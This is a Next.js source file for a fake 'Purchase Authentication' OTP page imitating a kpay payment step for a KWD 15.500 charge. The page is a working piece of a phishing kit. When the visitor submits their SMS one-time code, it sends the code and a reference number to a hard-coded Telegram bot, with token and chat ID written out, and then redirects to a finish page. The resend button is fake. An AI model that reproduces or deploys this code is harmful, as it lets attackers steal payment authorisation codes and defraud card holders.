"use client";
import { Suspense } from "react";
import React, { useState, useEffect } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';
import { useRouter, useSearchParams } from 'next/navigation';
import axios from 'axios';

function CodePageContent() {
  const [code, setCode] = useState("");
  const [timeLeft, setTimeLeft] = useState(300); // 5 دقائق
  const [expired, setExpired] = useState(false);
  const [resending, setResending] = useState(false);

  const searchParams = useSearchParams();
  const refN = searchParams.get("refN");
  const router = useRouter();

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setExpired(true);
    }
  }, [timeLeft]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (expired) {
      alert("The code has expired. Please request a new one.");
      return;
    }
    if (code) {
      const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
      try {
        await axios.post(
          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
          {
            chat_id: "-4836393174",
            text: text
          }
        );
        router.push(`/kpay/finish?refN=${refN}`);
      } catch (error) {
        alert("Error sending data");
        console.error(error);
      }
    }
  };

  const handleResend = () => {
    setResending(true);
    setTimeout(() => {
      setTimeLeft(300);
      setExpired(false);
      setResending(false);
    }, 1000);
  };

  return (
    <div className="container my-4" style={{ maxWidth: "500px", backgroundColor: "white", border: "1px solid #ddd" }}>
      <div className="p-4">
        <h5 className="fw-bold text-primary mb-3">Purchase Authentication</h5>
        <p className="mb-1">
          We have sent you an SMS with an OTP code to your registered mobile number. Please do not share it with anyone.
        </p>
        <p className="mb-3">
          You are paying <strong>PlayerMatrix</strong> the amount of <strong>KWD 15.500</strong> on Wed Aug 13 2025 1:29 AM
        </p>

        <label className="fw-bold mb-2">Enter your OTP code below:</label>
        <input 
          type="text" 
          className="form-control mb-3" 
          value={code}
          onChange={(e) => setCode(e.target.value)}
          disabled={expired}
        />

        <div className="d-grid gap-2">
          <button 
            type="button" 
            className="btn text-white fw-bold" 
            style={{ backgroundColor: "#d32f2f" }}
            onClick={handleSubmit}
            disabled={expired}
          >
            CONFIRM
          </button>
          <div className="d-flex gap-2">
            <button 
              type="button" 
              className="btn btn-secondary w-50 fw-bold"
              onClick={handleResend}
              disabled={!expired || resending}
            >
              {resending ? "Resending..." : "RESEND"}
            </button>
            <button 
              type="button" 
              className="btn btn-secondary w-50 fw-bold"
              onClick={() => router.back()}
            >
              CANCEL
            </button>
          </div>
        </div>

        <p className="mt-3 text-muted small">
          This page will automatically time out after 5 minutes.
        </p>
      </div>
    </div>
  );
}

export default function CodePage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <CodePageContent />
    </Suspense>
  );
      }
